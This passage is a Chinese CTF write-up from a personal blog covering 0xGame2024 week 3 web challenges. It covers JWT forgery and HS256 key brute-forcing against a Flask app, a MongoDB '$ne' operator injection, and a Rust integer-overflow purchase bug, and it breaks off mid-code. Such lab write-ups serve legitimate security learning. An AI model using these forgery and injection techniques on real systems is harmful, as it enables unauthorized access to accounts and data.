<!DOCTYPE html>
<html lang="zh">
  <head>
    
    <meta charset="UTF-8">
    <title>0xGame2024 week3 - N0tluS.site</title>
    <link rel="shortcut icon" href="/static/img/icon.png">
    <link rel="icon" href="/static/img/icon.png" sizes="192x192"/>
    
<link rel="stylesheet" href="/static/kico.css">
<link rel="stylesheet" href="/static/hingle.css">

    
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta property="og:site_name" content="N0tluS.site">
    <meta property="og:title" content="0xGame2024 week3"/>
    
    <style>body:before{ content: ''; background-image: url(https://api.paugram.com/wallpaper?source=gh) }</style>
    
<meta name="generator" content="Hexo 7.3.0"></head>

  <body>
    <header>
    <div class="head-title">
        <h4>N0tluS.site</h4>
    </div>
    <div class="head-action">
        <div class="toggle-btn"></div>
        <div class="light-btn"></div>
        <div class="search-btn"></div>
    </div>
    <form class="head-search" method="post">
        <input type="text" name="s" placeholder="搜索什么？">
    </form>
    <nav class="head-menu">
        <a href="/">首页</a>
        <div class="has-child">
            <a href>分类</a>
            <div class="sub-menu">
                <a class="category-link" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a><a class="category-link" href="/categories/wp/">wp</a>
            </div>
        </div>
        
            <a href="/about">关于我</a>
        
    </nav>
</header>

    <main>
    <div class="wrap min">
        <section class="post-title">
            <h2>0xGame2024 week3</h2>
            <div class="post-meta">
                <time class="date">2024.10.27</time>
            
                <span class="category"><a class="category-link" href="/categories/wp/">wp</a></span>
            
            </div>
        </section>
        <article class="post-content">
        
            <h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="hello-jwt"><a href="#hello-jwt" class="headerlink" title="hello_jwt"></a>hello_jwt</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">from</span> key <span class="keyword">import</span> KEY, FLAG</span><br><span class="line"></span><br><span class="line">users = &#123;&#125;</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    file_path = os.path.abspath(__file__)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        code = file.read()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, code=code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">        role = <span class="string">&quot;guest&quot;</span></span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;User already exists&quot;</span></span><br><span class="line">        users[username] = &#123;<span class="string">&quot;password&quot;</span>: password, <span class="string">&quot;role&quot;</span>: role&#125;</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>), code=<span class="number">302</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">not</span> <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;User does not exist&quot;</span></span><br><span class="line">        <span class="keyword">if</span> users[username][<span class="string">&quot;password&quot;</span>] != password:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid password&quot;</span></span><br><span class="line">        payload = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;role&quot;</span>: users[username][<span class="string">&quot;role&quot;</span>]&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            token = jwt.encode(payload, KEY, algorithm=<span class="string">&quot;HS256&quot;</span>)</span><br><span class="line">            response = make_response(redirect(url_for(<span class="string">&quot;flag&quot;</span>), code=<span class="number">302</span>))</span><br><span class="line">            response.set_cookie(<span class="string">&quot;token&quot;</span>, token)</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/flag&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>), code=<span class="number">302</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = jwt.decode(token, KEY, algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">    <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Token expired&quot;</span></span><br><span class="line">    <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid token&quot;</span></span><br><span class="line">    <span class="keyword">if</span> payload[<span class="string">&quot;role&quot;</span>] != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Only admin can view the flag&quot;</span></span><br><span class="line">    <span class="keyword">return</span> FLAG</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hint1&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint1</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>), code=<span class="number">302</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = jwt.decode(</span><br><span class="line">            token, KEY, algorithms=[<span class="string">&quot;HS256&quot;</span>], options=&#123;<span class="string">&quot;verify_signature&quot;</span>: <span class="literal">False</span>&#125;</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Token expired&quot;</span></span><br><span class="line">    <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid token&quot;</span></span><br><span class="line">    <span class="keyword">if</span> payload[<span class="string">&quot;role&quot;</span>] != <span class="string">&quot;Please, give me the hint&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Beg me for the hint&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;hint1.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hint2&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint2</span>():</span><br><span class="line">    tmp_key = (</span><br><span class="line">        <span class="string">&quot;Very very long and include many !@#$)*$&amp;@) so you can&#x27;t crack&#x27;s secret key&quot;</span></span><br><span class="line">    )</span><br><span class="line">    token = request.cookies.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>), code=<span class="number">302</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = jwt.decode(token, tmp_key, algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">    <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Token expired&quot;</span></span><br><span class="line">    <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid token&quot;</span></span><br><span class="line">    <span class="keyword">if</span> payload[<span class="string">&quot;role&quot;</span>] != <span class="string">&quot;But, I can see the temporary key&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Beg me for the hint&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;hint2.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">3000</span>)</span><br></pre></td></tr></table></figure>

<p>先看<code>/hint2</code>，拿到<code>tmp_key</code>后用<a href=https://jwt.io/>jwt.io</a>来计算jwt</p>
<img src="/2024/10/27/0xGame2024-week3/image-20241020223420005.png" class="" title="image-20241020223420005">

<p>再看<code>/hint1</code>，注意</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = jwt.decode(</span><br><span class="line">    token, KEY, algorithms=[<span class="string">&quot;HS256&quot;</span>], options=&#123;<span class="string">&quot;verify_signature&quot;</span>: <span class="literal">False</span>&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>也就是说解密jwt不受KEY影响，无需密钥直接生成jwt就好</p>
<img src="/2024/10/27/0xGame2024-week3/image-20241020223733654.png" class="" title="image-20241020223733654">

<p>那么尝试爆破，先生成字典</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_strings</span>():</span><br><span class="line">    alphabet = string.ascii_lowercase</span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, <span class="number">7</span>):  <span class="comment"># 从长度4到6</span></span><br><span class="line">        <span class="keyword">for</span> combination <span class="keyword">in</span> itertools.product(alphabet, repeat=length):</span><br><span class="line">            <span class="keyword">yield</span> <span class="string">&#x27;&#x27;</span>.join(combination)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    file = <span class="built_in">open</span>(<span class="string">&quot;secret.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]generating KEY...&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> generate_strings():</span><br><span class="line">        file.write(s)</span><br><span class="line">        file.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> s == <span class="string">&#x27;zzzzzz&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    file.close()</span><br></pre></td></tr></table></figure>

<p>然后用工具<a target="_blank" rel="noopener" href="https://github.com/wkend/CrackJWTKey">wkend&#x2F;CrackJWTKey: JWT秘钥爆破脚本 (github.com)</a>，得到密钥zrajz。用jwt.io伪造后发包</p>
<img src="/2024/10/27/0xGame2024-week3/image-20241021160634642.png" class="" title="image-20241021160634642">

<h3 id="next-db"><a href="#next-db" class="headerlink" title="next.db"></a>next.db</h3><p>关键部分</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//init.js</span></span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">MongoClient</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;mongodb&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> uri = process.<span class="property">env</span>.<span class="property">MONGODB_URI</span> || <span class="string">&quot;mongodb://127.0.0.1:27017/&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> client = <span class="keyword">new</span> <span class="title class_">MongoClient</span>(uri);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">init</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> db = client.<span class="title function_">db</span>(<span class="string">&#x27;next-db&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> collection = db.<span class="title function_">collection</span>(<span class="string">&#x27;frameworks&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> collection.<span class="title function_">insertMany</span>([</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">id</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">            <span class="attr">description</span>: process.<span class="property">env</span>.<span class="property">FLAG</span> || <span class="string">&quot;flag&#123;test&#125;&quot;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;Next.js&quot;</span>,</span><br><span class="line">            <span class="attr">description</span>: <span class="string">&quot;The React Framework for the Web&quot;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">id</span>: <span class="number">2</span>,</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;Nuxt.js&quot;</span>,</span><br><span class="line">            <span class="attr">description</span>: <span class="string">&quot;The Intuitive Vue Framework&quot;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">id</span>: <span class="number">3</span>,</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;React&quot;</span>,</span><br><span class="line">            <span class="attr">description</span>: <span class="string">&quot;The library for web and native user interfaces&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">id</span>: <span class="number">4</span>,</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;Vue.js&quot;</span>,</span><br><span class="line">            <span class="attr">description</span>: <span class="string">&quot;The Progressive JavaScript Framework&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> client.<span class="title function_">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">init</span>();</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//search.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">MongoClient</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;mongodb&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> uri = process.<span class="property">env</span>.<span class="property">MONGODB_URI</span> || <span class="string">&quot;mongodb://127.0.0.1:27017/&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> client = <span class="keyword">new</span> <span class="title class_">MongoClient</span>(uri);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">handler</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> !== <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">405</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;Method not allowed&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> &#123; name &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">if</span> (!name) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;Name is required&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (name === <span class="string">&quot;flag&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;You are not allowed to search for the flag&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> db = client.<span class="title function_">db</span>(<span class="string">&#x27;next-db&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> collection = db.<span class="title function_">collection</span>(<span class="string">&#x27;frameworks&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> results = <span class="keyword">await</span> collection.<span class="title function_">find</span>(&#123;</span><br><span class="line">      <span class="attr">$or</span>: [</span><br><span class="line">        &#123; name &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">$and</span>: [</span><br><span class="line">            &#123; <span class="attr">description</span>: &#123; <span class="attr">$regex</span>: name.<span class="title function_">toString</span>(), <span class="attr">$options</span>: <span class="string">&#x27;i&#x27;</span> &#125; &#125;,</span><br><span class="line">            &#123; <span class="attr">description</span>: &#123; <span class="attr">$ne</span>: process.<span class="property">env</span>.<span class="property">FLAG</span> || <span class="string">&quot;flag&#123;test&#125;&quot;</span> &#125; &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;).<span class="title function_">toArray</span>();</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(results);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Database query error:&#x27;</span>, error);</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;Internal Server Error&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mongodb数据库，不能直接查询flag，构造<code>&#123;&quot;$ne&quot;:1&#125;</code>查询所有name不为1的用户</p>
<img src="/2024/10/27/0xGame2024-week3/image-20241021172500866.png" class="" title="image-20241021172500866">

<h3 id="cargo-shop"><a href="#cargo-shop" class="headerlink" title="cargo_shop"></a>cargo_shop</h3><p>注意到User的balance的变量类型是i32，而<code>Goods</code>的<code>price</code>和<code>Hold</code>的<code>inventory</code>变量类型是u32。i32的取值范围为**-2147483648 到2147483647<strong>，u32的取值范围为</strong>0到4294967295**</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug, Clone, Serialize, Deserialize)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Goods</span> &#123;</span><br><span class="line">    name: <span class="type">String</span>,</span><br><span class="line">    price: <span class="type">u32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Debug, Clone, Serialize, Deserialize)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Hold</span> &#123;</span><br><span class="line">    goods: Goods,</span><br><span class="line">    inventory: <span class="type">u32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Debug, Serialize, Deserialize)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    holds: <span class="type">Vec</span>&lt;Hold&gt;,</span><br><span class="line">    balance: <span class="type">i32</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再来看purchase路由，在处理购买物品的时候先计算costs，而costs是i32类型的，先让其发生溢出，变成负数</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[get(<span class="string">&quot;/purchase/&#123;name&#125;/&#123;count&#125;&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">purchase</span>(info: web::Path&lt;(<span class="type">String</span>, <span class="type">u32</span>)&gt;, session: Session) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;<span class="type">String</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">Some</span>(<span class="keyword">mut</span> user) = session.get::&lt;User&gt;(<span class="string">&quot;user&quot;</span>)? <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">Ok</span>(<span class="string">&quot;user not found&quot;</span>.<span class="title function_ invoke__">to_string</span>());</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> (name, count) = info.<span class="title function_ invoke__">into_inner</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">Some</span>(goods) = GOODS_LIST.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">find</span>(|v| v.name == name) <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">Ok</span>(<span class="string">&quot;goods not found&quot;</span>.<span class="title function_ invoke__">to_string</span>());</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">costs</span> = (goods.price * count) <span class="keyword">as</span> <span class="type">i32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> costs &lt;= user.balance &#123;</span><br><span class="line">        user.balance -= costs;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(hold) = user.holds.<span class="title function_ invoke__">iter_mut</span>().<span class="title function_ invoke__">find</span>(|v| v.goods.name == goods.name) &#123;</span><br><span class="line">            hold.inventory += count;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            user.holds.<span class="title function_ invoke__">push</span>(Hold &#123;</span><br><span class="line">                goods: goods.<span class="title function_ invoke__">clone</span>(),</span><br><span class="line">                inventory: count,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        session.<span class="title function_ invoke__">insert</span>(<span class="string">&quot;user&quot;</span>, 